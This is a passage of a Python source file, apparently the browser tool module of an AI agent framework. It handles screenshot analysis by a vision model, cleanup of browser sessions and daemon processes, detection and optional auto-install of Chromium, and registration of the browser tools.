                "error": f"Failed to take screenshot ({mode} mode): {error_detail}"
            }
            return json.dumps(_copy_fallback_warning(error_response, result), ensure_ascii=False)

        actual_screenshot_path = result.get("data", {}).get("path")
        if actual_screenshot_path:
            screenshot_path = Path(actual_screenshot_path)

        # Check if screenshot file was created
        if not screenshot_path.exists():
            _cp = _get_cloud_provider()
            mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
            return json.dumps({
                "success": False,
                "error": (
                    f"Screenshot file was not created at {screenshot_path} ({mode} mode). "
                    f"This may indicate a socket path issue (macOS /var/folders/), "
                    f"a missing Chromium install ('agent-browser install'), "
                    f"or a stale daemon process."
                ),
            }, ensure_ascii=False)

        # Convert screenshot to base64 at full resolution.
        _screenshot_bytes = screenshot_path.read_bytes()
        _screenshot_b64 = base64.b64encode(_screenshot_bytes).decode("ascii")
        data_url = f"data:image/png;base64,{_screenshot_b64}"

        # Fast path: when native image routing is in effect for the active main
        # model, attach the screenshot directly instead of describing it through
        # an auxiliary vision LLM. The model inspects the pixels on its next
        # turn — no aux call, no information loss. Consistent with vision_analyze.
        from tools.vision_tools import (
            _build_native_vision_tool_result,
            _should_use_native_vision_fast_path,
        )

        if _should_use_native_vision_fast_path():
            native_result = _build_native_vision_tool_result(
                image_url=str(screenshot_path),
                question=question,
                image_data_url=data_url,
                image_size_bytes=len(_screenshot_bytes),
            )
            meta = native_result.setdefault("meta", {})
            meta["screenshot_path"] = str(screenshot_path)
            if _lp_fallback_warning:
                meta["fallback_warning"] = _lp_fallback_warning
            if annotate and result.get("data", {}).get("annotations"):
                meta["annotations"] = result["data"]["annotations"]
            native_result["text_summary"] = (
                f"{native_result.get('text_summary', '')} "
                f"Screenshot path: {screenshot_path}"
            ).strip()
            return native_result

        vision_prompt = (
            f"You are analyzing a screenshot of a web browser.\n\n"
            f"User's question: {question}\n\n"
            f"Provide a detailed and helpful answer based on what you see in the screenshot. "
            f"If there are interactive elements, describe them. If there are verification challenges "
            f"or CAPTCHAs, describe what type they are and what action might be needed. "
            f"Focus on answering the user's specific question."
        )

        # Use the centralized LLM router
        vision_model = _get_vision_model()
        logger.debug("browser_vision: analysing screenshot (%d bytes)",
                     len(_screenshot_bytes))

        # Read vision timeout/temperature from config (auxiliary.vision.*).
        # Local vision models (llama.cpp, ollama) can take well over 30s for
        # screenshot analysis, so the default timeout must be generous.
        vision_timeout = 120.0
        vision_temperature = 0.1
        try:
            from hermes_cli.config import load_config
            _cfg = load_config()
            _vision_cfg = cfg_get(_cfg, "auxiliary", "vision", default={})
            _vt = _vision_cfg.get("timeout")
            if _vt is not None:
                vision_timeout = float(_vt)
            _vtemp = _vision_cfg.get("temperature")
            if _vtemp is not None:
                vision_temperature = float(_vtemp)
        except Exception:
            pass

        call_kwargs = {
            "task": "vision",
            "messages": [
                {
                    "role": "user",
                    "content": [
                        {"type": "text", "text": vision_prompt},
                        {"type": "image_url", "image_url": {"url": data_url}},
                    ],
                }
            ],
            "temperature": vision_temperature,
            "timeout": vision_timeout,
        }
        if vision_model:
            call_kwargs["model"] = vision_model
        # Try full-size screenshot; on size-related rejection, downscale and retry.
        try:
            response = _lazy_call_llm(**call_kwargs)
        except Exception as _api_err:
            from tools.vision_tools import (
                _is_image_size_error, _resize_image_for_vision, _RESIZE_TARGET_BYTES,
            )
            if (_is_image_size_error(_api_err)
                    and len(data_url) > _RESIZE_TARGET_BYTES):
                logger.info(
                    "Vision API rejected screenshot (%.1f MB); "
                    "auto-resizing to ~%.0f MB and retrying...",
                    len(data_url) / (1024 * 1024),
                    _RESIZE_TARGET_BYTES / (1024 * 1024),
                )
                data_url = _resize_image_for_vision(
                    screenshot_path, mime_type="image/png")
                call_kwargs["messages"][0]["content"][1]["image_url"]["url"] = data_url
                response = _lazy_call_llm(**call_kwargs)
            else:
                raise

        analysis = (response.choices[0].message.content or "").strip()
        # Redact secrets the vision LLM may have read from the screenshot.
        from agent.redact import redact_sensitive_text
        analysis = redact_sensitive_text(analysis)
        response_data = {
            "success": True,
            "analysis": analysis or "Vision analysis returned no content.",
            "screenshot_path": str(screenshot_path),
        }
        _copy_fallback_warning(response_data, result)
        # Include annotation data if annotated screenshot was taken
        if annotate and result.get("data", {}).get("annotations"):
            response_data["annotations"] = result["data"]["annotations"]
        return json.dumps(response_data, ensure_ascii=False)

    except Exception as e:
        # Keep the screenshot if it was captured successfully — the failure is
        # in the LLM vision analysis, not the capture.  Deleting a valid
        # screenshot loses evidence the user might need.  The 24-hour cleanup
        # in _cleanup_old_screenshots prevents unbounded disk growth.
        logger.warning("browser_vision failed: %s", e, exc_info=True)
        error_info = {"success": False, "error": f"Error during vision analysis: {str(e)}"}
        if screenshot_path.exists():
            error_info["screenshot_path"] = str(screenshot_path)
            error_info["note"] = "Screenshot was captured but vision analysis failed. You can still share it via MEDIA:<path>."
        _copy_fallback_warning(error_info, result if 'result' in locals() else {})
        return json.dumps(error_info, ensure_ascii=False)


def _cleanup_old_screenshots(screenshots_dir, max_age_hours=24):
    """Remove browser screenshots older than max_age_hours to prevent disk bloat.

    Throttled to run at most once per hour per directory to avoid repeated
    scans on screenshot-heavy workflows.
    """
    key = str(screenshots_dir)
    now = time.time()
    if now - _last_screenshot_cleanup_by_dir.get(key, 0.0) < 3600:
        return
    _last_screenshot_cleanup_by_dir[key] = now

    try:
        cutoff = time.time() - (max_age_hours * 3600)
        for f in screenshots_dir.glob("browser_screenshot_*.png"):
            try:
                if f.stat().st_mtime < cutoff:
                    f.unlink()
            except Exception as e:
                logger.debug("Failed to clean old screenshot %s: %s", f, e)
    except Exception as e:
        logger.debug("Screenshot cleanup error (non-critical): %s", e)


def _cleanup_old_recordings(max_age_hours=72):
    """Remove browser recordings older than max_age_hours to prevent disk bloat."""
    try:
        hermes_home = get_hermes_home()
        recordings_dir = hermes_home / "browser_recordings"
        if not recordings_dir.exists():
            return
        cutoff = time.time() - (max_age_hours * 3600)
        for f in recordings_dir.glob("session_*.webm"):
            try:
                if f.stat().st_mtime < cutoff:
                    f.unlink()
            except Exception as e:
                logger.debug("Failed to clean old recording %s: %s", f, e)
    except Exception as e:
        logger.debug("Recording cleanup error (non-critical): %s", e)


# ============================================================================
# Cleanup and Management Functions
# ============================================================================

def _retry_provider_cleanup_records(
    records: List[_PendingProviderCleanup],
) -> bool:
    all_closed = True
    for record in records:
        if not _attempt_provider_session_close(
            record.task_id,
            record.provider,
            record.session_id,
        ):
            all_closed = False
    return all_closed


def _begin_task_cleanup_locked(
    bare_task_id: str,
    reason: BrowserCleanupReason,
) -> BrowserCleanupReason:
    """Enter RETIRING and advance the generation before inspecting sessions."""
    state = _task_state_locked(bare_task_id)
    previous_reason = _browser_task_cleanup_reasons.get(bare_task_id)
    if state is BrowserTaskState.RETIRED:
        effective_reason = BrowserCleanupReason.TERMINAL
    elif (
        state is BrowserTaskState.RETIRING
        and previous_reason is not None
        and _cleanup_reason_retires_task(previous_reason)
        and not _cleanup_reason_retires_task(reason)
    ):
        effective_reason = previous_reason
    else:
        effective_reason = reason
    _advance_task_generation_locked(bare_task_id)
    _set_task_state_locked(
        bare_task_id,
        BrowserTaskState.RETIRING,
        cleanup_reason=effective_reason,
    )
    return effective_reason


def _is_hermes_owned_local_browser_session(session_info: Dict[str, Any]) -> bool:
    """Return whether headed cross-turn persistence may retain this session."""
    return not session_info.get("cdp_url") and not session_info.get("bb_session_id")


def _cleanup_browser_session_keys(
    task_id: str,
    session_keys: Optional[List[str]] = None,
    *,
    reason: BrowserCleanupReason | str,
    preserve_local_headed: bool = False,
) -> bool:
    """Cleanup selected ownership under one bare-task lifecycle transition."""
    reason = _coerce_cleanup_reason(reason)
    bare_task_id = _bare_task_id_for_session_key(task_id or "default")
    include_camofox = session_keys is None and _is_camofox_mode()

    # Conversation turns call the per-turn boundary even when no browser tool
    # ran.  Do not manufacture a lifecycle generation/state/lock row for that
    # no-op case; otherwise a long-lived process accumulates one entry per
    # browser-free task forever.  STARTING/RETIRING are deliberately excluded:
    # those states represent an in-flight creator or retry that still needs the
    # generation fence below.
    with _cleanup_lock:
        state = _task_state_locked(bare_task_id)
        if session_keys is None:
            has_selected_session = any(
                _bare_task_id_for_session_key(key) == bare_task_id
                for key in _active_sessions
            )
        else:
            has_selected_session = any(
                key in _active_sessions for key in dict.fromkeys(session_keys)
            )
        has_pending_provider = any(
            record.task_id == bare_task_id
            for record in _pending_provider_cleanups.values()
        )
        if (
            not include_camofox
            and not has_selected_session
            and not has_pending_provider
            and bare_task_id not in _browser_task_cleanup_locks
            and state in {BrowserTaskState.ACTIVE, BrowserTaskState.RETIRED}
        ):
            return True

    operation_lock = _task_cleanup_operation_lock(bare_task_id)
    with operation_lock:
        with _cleanup_lock:
            effective_reason = _begin_task_cleanup_locked(bare_task_id, reason)
            if session_keys is None:
                if _is_local_sidecar_key(task_id):
                    selected_keys = [task_id] if task_id in _active_sessions else []
                else:
                    selected_keys = [
                        key
                        for key, info in _active_sessions.items()
                        if _bare_task_id_for_session_key(key) == bare_task_id
                        and not (
                            preserve_local_headed
                            and _is_hermes_owned_local_browser_session(info)
                        )
                    ]
            else:
                selected_keys = list(dict.fromkeys(session_keys))
            # Camofox keeps task ownership in its own module rather than in
            # ``_active_sessions``. Preserve the pre-lifecycle hard-cleanup
            # path by scheduling its bare task even when no agent-browser
            # session key exists.
            if include_camofox and task_id not in selected_keys:
                selected_keys.append(task_id)
            pending_before = [
                record
                for record in _pending_provider_cleanups.values()
                if record.task_id == bare_task_id
            ]

        # Fence supervisor publication even when no browser session has been
        # published yet. Per-session cleanup repeats this stop harmlessly.
        for supervisor_key in set(selected_keys) | {task_id}:
            _stop_cdp_supervisor(supervisor_key)

        pending_retries_closed = _retry_provider_cleanup_records(pending_before)
        cleanup_results = {
            session_key: _cleanup_single_browser_session(session_key)
            for session_key in selected_keys
        }
        failed_keys = [
            key
            for key, cleaned in cleanup_results.items()
            if cleaned is False
        ]

        with _cleanup_lock:
            retained_failed_keys = []
            for failed_key in failed_keys:
                retained = _active_sessions.get(failed_key)
                if retained is not None:
                    retained["_cleanup_retry_pending"] = True
                    retained_failed_keys.append(failed_key)

            recorded_key = _last_active_session_key.get(bare_task_id)
            if retained_failed_keys:
                if recorded_key not in retained_failed_keys:
                    _last_active_session_key[bare_task_id] = retained_failed_keys[0]
            elif recorded_key in selected_keys:
                # If the primary was cleaned while a headed local sidecar was
                # deliberately retained, keep normal commands on that survivor.
                sidecar_key = f"{bare_task_id}{_LOCAL_SUFFIX}"
                if (
                    task_id == bare_task_id
                    and sidecar_key not in selected_keys
                    and sidecar_key in _active_sessions
                ):
                    _last_active_session_key[bare_task_id] = sidecar_key
                else:
                    _last_active_session_key.pop(bare_task_id, None)
            elif (
                not failed_keys
                and not _is_local_sidecar_key(task_id)
                and not _task_has_active_sessions_locked(bare_task_id)
            ):
                _last_active_session_key.pop(bare_task_id, None)

            has_active_sessions = _task_has_active_sessions_locked(bare_task_id)
            has_pending_provider = any(
                record.task_id == bare_task_id
                for record in _pending_provider_cleanups.values()
            )
            cleanup_confirmed = (
                not failed_keys
                and pending_retries_closed
                and not has_pending_provider
            )
            if cleanup_confirmed:
                if has_active_sessions:
                    _set_task_state_locked(bare_task_id, BrowserTaskState.ACTIVE)
                elif _cleanup_reason_retires_task(effective_reason):
                    _set_task_state_locked(bare_task_id, BrowserTaskState.RETIRED)
                else:
                    _set_task_state_locked(bare_task_id, BrowserTaskState.ACTIVE)
                if not has_active_sessions:
                    for activity_key in list(_session_last_activity):
                        if _bare_task_id_for_session_key(activity_key) == bare_task_id:
                            _session_last_activity.pop(activity_key, None)
            else:
                _set_task_state_locked(
                    bare_task_id,
                    BrowserTaskState.RETIRING,
                    cleanup_reason=effective_reason,
                )
                # Keep provider-only retry ownership visible to the background
                # reaper even after page metadata has been removed.
                _session_last_activity.setdefault(bare_task_id, time.time())
        return cleanup_confirmed


def cleanup_browser(
    task_id: Optional[str] = None,
    *,
    reason: BrowserCleanupReason | str = BrowserCleanupReason.TERMINAL,
) -> bool:
    """
    Clean up browser session(s) for a task.

    Called automatically when a task completes or when inactivity timeout is reached.
    Closes both the agent-browser/Browserbase session and Camofox sessions.

    When ``task_id`` is a bare task identifier (no ``::local`` suffix), reaps
    BOTH the cloud/primary session AND any hybrid-routing local sidecar that
    may have been spawned for LAN/localhost URLs in the same task.  When
    ``task_id`` already carries a ``::local`` suffix (called from the inactivity
    cleanup loop against a specific session key), reaps only that one.

    Args:
        task_id: Task identifier (or explicit session key)
    """
    return _cleanup_browser_session_keys(
        task_id or "default",
        reason=reason,
    )


def cleanup_browser_for_turn(task_id: Optional[str] = None) -> bool:
    """Enforce the per-turn boundary while retaining only local headed state."""
    task_id = task_id or "default"
    preserve_local = _is_headed_mode()
    if _is_camofox_mode():
        # Camofox owns sessions outside ``_active_sessions``. Preserve headed
        # sessions, and avoid manufacturing lifecycle rows for turns that never
        # created process-local Camofox ownership. Hard cleanup still goes
        # through ``cleanup_browser`` and retains its untracked-session sweep.
        if preserve_local:
            return True
        try:
            from tools.browser_camofox import camofox_has_session

            if not camofox_has_session(task_id):
                # ``browser_navigate`` publishes its task lock before
                # Camofox creates process-local session state.  Do not let
                # the browser-free fast path bypass that in-flight owner;
                # the ordinary cleanup path will wait for navigation to
                # finish, then retire the Camofox task.
                bare_task_id = _bare_task_id_for_session_key(task_id)
                with _cleanup_lock:
                    if bare_task_id not in _browser_task_cleanup_locks:
                        return True
        except Exception:
            pass
    return _cleanup_browser_session_keys(
        task_id,
        reason=BrowserCleanupReason.TERMINAL,
        preserve_local_headed=preserve_local,
    )


def _cleanup_single_browser_session(
    task_id: str,
) -> bool:
    """Internal: reap a single browser session by its exact session key."""
    with _cleanup_lock:
        session_info = _active_sessions.get(task_id)

    # An owned shared-CDP page must be closed through the browser-level CDP
    # endpoint and verified by exact target ID before any local ownership is
    # removed. Do this before stopping the supervisor; it may be the only live
    # connection available for a reliable close.
    task_owned_shared_cdp = bool(
        session_info and _is_task_owned_shared_cdp_session(session_info)
    )
    if task_owned_shared_cdp and session_info:
        target_id = str(session_info.get("target_id") or "").strip()
        cdp_url = str(session_info.get("cdp_url") or _get_cdp_override()).strip()
        if not target_id or not _close_shared_cdp_target_confirmed(cdp_url, target_id):
            logger.warning(
                "Exact shared-CDP target close could not be confirmed for task %s; "
                "retaining session ownership for retry",
                task_id,
            )
            return False

    # Stop the CDP supervisor only after the exact target is gone.
    _stop_cdp_supervisor(task_id)

    # Also clean up Camofox session if running in Camofox mode.
    # Skip full close when managed persistence is enabled — the browser
    # profile (and its session cookies) must survive across agent tasks.
    # The inactivity reaper still frees idle resources.
    if _is_camofox_mode():
        try:
            from tools.browser_camofox import camofox_close, camofox_soft_cleanup
            if not camofox_soft_cleanup(task_id):
                camofox_close(task_id)
        except Exception as e:
            logger.debug("Camofox cleanup for task %s: %s", task_id, e)

    logger.debug("cleanup_browser called for task_id: %s", task_id)
    logger.debug("Active sessions: %s", list(_active_sessions.keys()))

    # Check if session exists (under lock), but don't remove yet -
    # _run_browser_command needs it to build the close command.
    with _cleanup_lock:
        session_info = _active_sessions.get(task_id)

    if session_info:
        bb_session_id = session_info.get("bb_session_id")
        logger.debug("Found session for task %s: bb_session_id=%s", task_id, bb_session_id)

        # Stop auto-recording before closing (saves the file)
        _maybe_stop_recording(task_id)

        # An expired cloud CDP URL cannot accept an agent-browser close command.
        # Avoid feeding it back through _get_session_info(), which would try to
        # renew the session recursively while cleanup is still in progress.
        if _session_has_expired(session_info):
            logger.debug(
                "Skipping agent-browser close for expired session %s",
                task_id,
            )
        else:
            try:
                # For shared-CDP sessions, the real page was already closed and
                # verified above. This command only disconnects the named local
                # agent-browser session; it must not perform another tab close.
                close_result = _run_browser_command(
                    task_id,
                    "close",
                    [],
                    timeout=10,
                    _allow_cleanup=True,
                )
                if not close_result.get("success"):
                    logger.warning(
                        "agent-browser session close failed for task %s: %s",
                        task_id,
                        close_result.get("error", close_result),
                    )
                logger.debug(
                    "agent-browser close command completed for task %s",
                    task_id,
                )
            except Exception as e:
                logger.warning("agent-browser close failed for task %s: %s", task_id, e)

        # Page/target ownership is now gone (or provider-authoritative close
        # below will release it). Remove it independently from provider API
        # ownership so a failed provider close cannot resurrect/adopt a page.
        with _cleanup_lock:
            _active_sessions.pop(task_id, None)
            _session_last_activity.pop(task_id, None)

        # Cloud mode: close the cloud browser session via provider API.
        # Local sidecars have bb_session_id=None so this no-ops for them.
        provider_closed = True
        if bb_session_id:
            provider = session_info.get("_provider_cleanup_owner")
            provider_closed = _attempt_provider_session_close(
                task_id,
                provider,
                str(bb_session_id),
            )

        # Kill the daemon process and clean up socket directory
        session_name = session_info.get("session_name", "")
        if session_name:
            socket_dir = os.path.join(_socket_safe_tmpdir(), f"agent-browser-{session_name}")
            if os.path.exists(socket_dir):
                # agent-browser writes {session}.pid in the socket dir
                pid_file = os.path.join(socket_dir, f"{session_name}.pid")
                if os.path.isfile(pid_file):
                    try:
                        from tools.process_registry import ProcessRegistry
                        daemon_pid = int(Path(pid_file).read_text(encoding="utf-8").strip())
                        ProcessRegistry._terminate_host_pid(daemon_pid)
                        logger.debug("Killed daemon pid %s for %s", daemon_pid, session_name)
                    except (ProcessLookupError, ValueError, PermissionError, OSError):
                        logger.debug("Could not kill daemon pid for %s (already dead or inaccessible)", session_name)
                shutil.rmtree(socket_dir, ignore_errors=True)

        logger.debug("Removed task %s from active sessions", task_id)
        return provider_closed
    else:
        logger.debug("No active session found for task_id: %s", task_id)
    return True


def cleanup_all_browsers() -> None:
    """
    Clean up all active browser sessions.

    Useful for cleanup on shutdown.
    """
    with _cleanup_lock:
        task_ids = {
            _bare_task_id_for_session_key(task_id)
            for task_id in _active_sessions
        }
        task_ids.update(
            record.task_id for record in _pending_provider_cleanups.values()
        )
    for task_id in task_ids:
        cleanup_browser(task_id)

    # Tear down CDP supervisors for all tasks so background threads exit.
    try:
        from tools.browser_supervisor import SUPERVISOR_REGISTRY  # type: ignore[import-not-found]
        SUPERVISOR_REGISTRY.stop_all()
    except Exception:
        pass

    # Reset cached lookups so they are re-evaluated on next use.
    global _cached_agent_browser, _agent_browser_resolved
    global _cached_pin_tab_agent_browser, _pin_tab_agent_browser_resolved
    global _pin_tab_failure_cache
    global _cached_command_timeout, _command_timeout_resolved
    global _cached_chromium_installed
    global _cached_browser_engine, _browser_engine_resolved
    _cached_agent_browser = None
    _agent_browser_resolved = False
    _pin_tab_agent_browser_resolved = False
    _cached_pin_tab_agent_browser = None
    _pin_tab_failure_cache = None
    _discover_homebrew_node_dirs.cache_clear()
    # Flip the resolved flag BEFORE nulling the cache so a concurrent
    # reader never sees ``resolved=True`` with ``cache=None`` (#14331).
    _command_timeout_resolved = False
    _cached_command_timeout = None
    _cached_chromium_installed = None
    global _chromium_autoinstall_attempted
    _chromium_autoinstall_attempted = False
    _cached_browser_engine = None
    _browser_engine_resolved = False

# ============================================================================
# Requirements Check
# ============================================================================


# Cache for Chromium discovery. Invalidated by _reset_browser_caches.
_cached_chromium_installed: Optional[bool] = None


def _chromium_search_roots() -> List[str]:
    """Directories to scan for a Chromium / headless-shell build.

    Order mirrors what agent-browser and Playwright actually probe:

    1. ``PLAYWRIGHT_BROWSERS_PATH`` when set (Docker image sets this to
       ``/opt/hermes/.playwright``).
    2. ``~/.cache/ms-playwright`` — Playwright's default on Linux/macOS.
    3. ``~/Library/Caches/ms-playwright`` — Playwright's default on macOS.
    4. ``%USERPROFILE%\\AppData\\Local\\ms-playwright`` — Playwright's default
       on Windows.
    """
    roots: List[str] = []
    env_path = os.environ.get("PLAYWRIGHT_BROWSERS_PATH", "").strip()
    if env_path and env_path != "0":
        roots.append(env_path)
    home = os.path.expanduser("~")
    roots.append(os.path.join(home, ".cache", "ms-playwright"))
    if sys.platform == "darwin":
        roots.append(os.path.join(home, "Library", "Caches", "ms-playwright"))
    if sys.platform == "win32":
        local = os.environ.get("LOCALAPPDATA") or os.path.join(
            home, "AppData", "Local"
        )
        roots.append(os.path.join(local, "ms-playwright"))
    return roots


def _chromium_installed() -> bool:
    """Return True when a usable Chromium (or headless-shell) build is on disk.

    Checks, in order:

    1. ``AGENT_BROWSER_EXECUTABLE_PATH`` env var — the official way to point
       agent-browser at a pre-installed Chrome/Chromium.
    2. System Chrome/Chromium in PATH (``google-chrome``, ``chromium``,
       ``chromium-browser``, ``chrome``).
    3. Playwright's browser cache (current logic) — directories containing
       ``chromium-*`` or ``chromium_headless_shell-*``.

    agent-browser (0.26+) downloads Playwright's chromium / headless-shell
    builds into ``PLAYWRIGHT_BROWSERS_PATH`` and won't start without at least
    one of the three above being present.  Without a browser binary the CLI
    hangs on first use until the command timeout fires (often ~30s).  Guarding
    the tool behind this check prevents advertising a capability that will
    fail at runtime.
    """
    global _cached_chromium_installed
    if _cached_chromium_installed is not None:
        return _cached_chromium_installed

    # 1. AGENT_BROWSER_EXECUTABLE_PATH — explicit user-configured browser
    ab_path = os.environ.get("AGENT_BROWSER_EXECUTABLE_PATH", "").strip()
    if ab_path:
        if os.path.isfile(ab_path) or shutil.which(ab_path):
            _cached_chromium_installed = True
            return True

    # 2. System Chrome/Chromium in PATH (common names)
    system_chrome = (
        shutil.which("google-chrome")
        or shutil.which("chromium")
        or shutil.which("chromium-browser")
        or shutil.which("chrome")
    )
    if system_chrome:
        _cached_chromium_installed = True
        return True

    # 3. Playwright browser cache (legacy — chromium-* / chromium_headless_shell-* dirs)
    for root in _chromium_search_roots():
        if not root or not os.path.isdir(root):
            continue
        try:
            entries = os.listdir(root)
        except OSError:
            continue
        # Playwright names them ``chromium-<build>`` and
        # ``chromium_headless_shell-<build>``; agent-browser accepts either.
        for entry in entries:
            if entry.startswith("chromium-") or entry.startswith(
                "chromium_headless_shell-"
            ):
                _cached_chromium_installed = True
                return True

    _cached_chromium_installed = False
    return False


# One-shot per process: a 170MB download that fails (or is slow) must not be
# retried on every browser call. Reset by _reset_browser_caches() for tests.
_chromium_autoinstall_attempted = False


def _maybe_autoinstall_chromium() -> bool:
    """Best-effort, gated download of the Chromium *binary* on local cold start.

    Closes the "the PR doesn't actually install the missing browser" gap for
    the common case — a Chromium binary that was simply never downloaded.
    Scope is deliberately narrow:

    - Binary only (``agent-browser install``), never ``--with-deps`` — that
      shells ``apt`` and needs root, so missing *system libraries* stay a user
      action (the timeout/blocked hints already point there).
    - Gated by ``security.allow_lazy_installs`` (same opt-out as every other
      lazy install) and skipped in Docker, where Chromium ships in the image.
    - Attempted once per process.

    Returns True only when Chromium is present afterwards.
    """
    global _chromium_autoinstall_attempted
    if _chromium_autoinstall_attempted:
        return _chromium_installed()
    _chromium_autoinstall_attempted = True

    if _running_in_docker():
        return False

    from tools.lazy_deps import _allow_lazy_installs
    if not _allow_lazy_installs():
        return False

    try:
        browser_cmd = _find_agent_browser()
    except FileNotFoundError:
        return False

    if _is_npx_agent_browser_sentinel(browser_cmd):
        install_cmd = [
            _resolve_npx_bin() or "npx", "--ignore-scripts", "-y", AGENT_BROWSER_NPX_SPEC, "install",
        ]
    else:
        install_cmd = [browser_cmd, "install"]

    logger.info(
        "browser: Chromium missing — auto-installing the browser binary "
        "(one-time ~170MB; disable via security.allow_lazy_installs)"
    )
    try:
        install_env = _build_browser_env()
        if _is_npx_agent_browser_sentinel(browser_cmd):
            _apply_agent_browser_npm_policy(install_env)
        proc = subprocess.run(
            install_cmd,
            capture_output=True,
            text=True, encoding='utf-8', errors='replace',
            timeout=600,
            env=install_env,
        )
    except (OSError, subprocess.SubprocessError) as e:
        logger.warning("browser: Chromium auto-install failed to start: %s", e)
        return False

    if proc.returncode != 0:
        tail = (proc.stderr or proc.stdout or "").strip()[-300:]
        logger.warning(
            "browser: Chromium auto-install exited %s: %s", proc.returncode, tail
        )
        return False

    global _cached_chromium_installed
    _cached_chromium_installed = None
    return _chromium_installed()


def _running_in_docker() -> bool:
    """Best-effort detection of whether we're inside a Docker container."""
    if os.path.exists("/.dockerenv"):
        return True
    try:
        with open("/proc/1/cgroup", "rt", encoding="utf-8") as fp:
            return "docker" in fp.read()
    except OSError:
        return False


def check_browser_requirements() -> bool:
    """
    Check if browser tool requirements are met.

    In **local mode** (no cloud provider configured): the ``agent-browser``
    CLI must be findable. Chrome/Chromium is required for the default Chrome
    engine and for fallback/screenshot paths, but not for Lightpanda-only text
    navigation/snapshot workflows.

    In **cloud mode** (Browserbase, Browser Use, or Firecrawl): the CLI
    and the provider's required credentials must be present. The cloud
    provider hosts its own Chromium, so no local browser binary is needed.

    Returns:
        True if all requirements are met, False otherwise
    """
    # Browser Use CLI backend — browser_exec replaces the whole browser_*
    # surface (including browser_cdp/browser_dialog, whose check_fns funnel
    # through here), so hide these tools from the model.
    if _is_browser_use_cli_mode():
        return False

    # Camofox backend — only needs the server URL, no agent-browser CLI
    if _is_camofox_mode():
        return True

    # CDP override mode can connect to an existing remote/local browser endpoint
    # without requiring the local agent-browser binary on PATH.
    # Raw (no-I/O) check: this runs during tool-schema assembly at startup,
    # where a stale endpoint must not cost a blocking HTTP probe.
    if _get_cdp_override_raw():
        return True

    # The agent-browser CLI is required for local launch and cloud-provider flows.
    # Tool-schema assembly runs during Desktop startup; do not execute
    # ``agent-browser --version`` here, because Windows .cmd shims route through
    # cmd.exe and can flash a console before the user invokes any browser tool.
    # Actual browser execution paths still validate the candidate before use.
    try:
        browser_cmd = _find_agent_browser(validate=False)
    except FileNotFoundError:
        return False

    # On Termux, the bare npx fallback is too fragile to treat as a satisfied
    # local browser dependency. Require a real install (global or local) so the
    # browser tool is not advertised as available when it will likely fail on
    # first use.
    if _requires_real_termux_browser_install(browser_cmd):
        return False

    # In cloud mode, also require provider credentials. Cloud browsers
    # don't need a local Chromium binary.
    provider = _get_cloud_provider()
    if provider is not None:
        return provider.is_configured()

    # Local mode with Lightpanda can provide text/navigation tools without a
    # local Chromium install. Chrome fallback, screenshots, and browser_vision
    # will still return actionable Chromium install errors if invoked.
    if _using_lightpanda_engine():
        return True

    # Local Chrome mode: agent-browser needs a Chromium build on disk. Without
    # it the CLI hangs on first use until the command timeout fires.
    if not _chromium_installed():
        return False

    return True


def check_browser_vision_requirements() -> bool:
    """Whether ``browser_vision`` should be advertised to the model.

    Requires BOTH a working browser (``check_browser_requirements``) AND a
    resolvable vision backend. Without the vision check, the tool stays in
    the model's tool list even when no vision provider is configured, then
    fails at call time with a cryptic provider-side error like
    ``unknown variant `image_url`, expected `text``` (issue #31179).
    """
    if not check_browser_requirements():
        return False
    try:
        from tools.vision_tools import check_vision_requirements
    except ImportError:
        return False
    return check_vision_requirements()


# ============================================================================
# Module Test
# ============================================================================

if __name__ == "__main__":
    """
    Simple test/demo when run directly
    """
    print("🌐 Browser Tool Module")
    print("=" * 40)

    _cp = _get_cloud_provider()
    mode = "local" if _cp is None else f"cloud ({_cp.provider_name()})"
    print(f"   Mode: {mode}")

    # Check requirements
    if check_browser_requirements():
        print("✅ All requirements met")
    else:
        print("❌ Missing requirements:")
        try:
            browser_cmd = _find_agent_browser()
            if _requires_real_termux_browser_install(browser_cmd):
                print("   - bare npx fallback found (insufficient on Termux local mode)")
                print(f"     Install: {_browser_install_hint()}")
            elif _cp is None and not _chromium_installed():
                print("   - Chromium browser binary not found")
                searched = ", ".join(_chromium_search_roots()) or "(no candidate paths)"
                print(f"     Searched: {searched}")
                if _running_in_docker():
                    print(
                        "     Docker: pull the latest image — the current one "
                        "predates the bundled Chromium install"
                    )
                    print("       docker pull ghcr.io/nousresearch/hermes-agent:latest")
                else:
                    print("     Install it with:")
                    print("       npx agent-browser install --with-deps")
                    print("     Or:  npx playwright install --with-deps chromium")
        except FileNotFoundError:
            print("   - agent-browser CLI not found")
            print(f"     Install: {_browser_install_hint()}")
        if _cp is not None and not _cp.is_configured():
            print(f"   - {_cp.provider_name()} credentials not configured")
            print("   Tip: set browser.cloud_provider to 'local' to use free local mode instead")

    print("\n📋 Available Browser Tools:")
    for schema in BROWSER_TOOL_SCHEMAS:
        print(f"  🔹 {schema['name']}: {schema['description'][:60]}...")

    print("\n💡 Usage:")
    print("  from tools.browser_tool import browser_navigate, browser_snapshot")
    print("  result = browser_navigate('https://example.com', task_id='my_task')")
    print("  snapshot = browser_snapshot(task_id='my_task')")


# ---------------------------------------------------------------------------
# Registry
# ---------------------------------------------------------------------------
from tools.registry import registry, tool_error

_BROWSER_SCHEMA_MAP = {s["name"]: s for s in BROWSER_TOOL_SCHEMAS}

registry.register(
    name="browser_navigate",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_navigate"],
    handler=lambda args, **kw: browser_navigate(url=args.get("url", ""), task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="🌐",
)
registry.register(
    name="browser_snapshot",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_snapshot"],
    handler=lambda args, **kw: browser_snapshot(
        full=args.get("full", False), task_id=kw.get("task_id"), user_task=kw.get("user_task")),
    check_fn=check_browser_requirements,
    emoji="📸",
)
registry.register(
    name="browser_click",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_click"],
    handler=lambda args, **kw: browser_click(ref=args.get("ref", ""), task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="👆",
)
registry.register(
    name="browser_type",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_type"],
    handler=lambda args, **kw: browser_type(ref=args.get("ref", ""), text=args.get("text", ""), task_id=kw.get("task_id")),
    check_fn=check_browser_requirements,
    emoji="⌨️",
)
registry.register(
    name="browser_scroll",
    toolset="browser",
    schema=_BROWSER_SCHEMA_MAP["browser_scroll"],
    handler=lambda args, **kw: browser_scroll(direction=args.get("direction", "down"), task_id=kw.get("task_id")),
